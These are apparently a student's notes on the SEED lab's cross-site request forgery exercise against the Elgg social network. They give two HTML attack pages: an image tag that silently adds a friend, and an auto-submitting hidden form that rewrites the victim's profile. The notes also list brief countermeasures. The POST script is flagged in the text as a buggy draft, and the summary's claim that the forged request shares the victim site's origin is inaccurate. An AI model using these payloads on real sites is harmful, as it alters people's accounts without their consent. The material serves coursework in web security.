# Cross site Request Forgery 

## Summary

#### Condition 
* Victim is logged in to the vulnerable website. 
* Attacker does social engineering, and victim has opened the attacker's website in the same browser. 

#### What happens ? 
* The attacker's website sends a HTTP request to the vulnerable website.  
* The request,technically, has the same origin as that of the victim website.Victim's browser is tricked and attaches the cookie alongwith the request. 
* Attacker is able to send the request to the vulnerable website on victim's behalf. 

## Useful Links:
* Seedlab Tasks, http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Web/Web_CSRF_Elgg/Web_CSRF_Elgg.pdf
* https://www.acunetix.com/websitesecurity/csrf-attacks/

## Seedlab Tasks:
Note : Students should create HTML pages and host them locally. Instructions about this is given in the PDF. 

#### Task 1 : CSRF attack using GET Request: Adding friends

```html
<html>
<body>
<h1> Hello World ! </h1>
<img src="http://www.csrflabelgg.com/action/friends/add?friend=42">
</body>
</html>
```

#### Task 2: CSRF attack using POST request:Changing Profile 
Note : This is a draft script. It has few issues. 

```html
<html>
<body>

<h1>Hello World test two ! </h1>


<script type="text/javascript">
   function post(url,fields)
   {
  //create a <form> element.
   var p = document.createElement("form");
   //construct the form
   p.action = url;
   p.innerHTML = fields;
   p.target = "_self";
   p.method = "post";
   //append the form to the current page.
   document.body.appendChild(p);
   //submit the form
   p.submit();
   }

function csrf_hack()
   {
   var fields;
   var victim_id=elgg.page_owner.guid;
   // The following are form entries that need to be filled out
   // by attackers. The entries are made hidden, so the victim
   // won’t be able to see them.
   fields += "<input type=’hidden’ name=’name’ value=’Samy’/>";
   fields += "<input type=’hidden’ name=’description’ value=’Samy is my Hero’ />";
   fields += "<input type=’hidden’ name=’accesslevel[description]’ value=’2’ />";
   fields += "<input type=’hidden’ name=’briefdescription’ value=’hello world /’>";
   fields += "<input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’/>";
   fields += "<input type=’hidden’ name=’location’ value=’’ />";
   fields += "<input type=’hidden’ name=’accesslevel[location]’ value=’2’ />";
   fields += "<input type=’hidden’ name=’guid’ value=’39’ />";
   var url = "http://www.csrflabelgg.com/action/profile/edit";
   post(url,fields);
  }

// invoke csrf_hack() after the page is loaded.
window.onload = function() { csrf_hack();}
</script>

</body>
</html>

```

## Preventive Measures: 
* Maintaining secrect token in the vulnerable page. 

* In Elgg (SeedLab), go to elgg/engine/lib/actions.php, and in Function action_gatekeeper, just comment out the "return true" statement. 
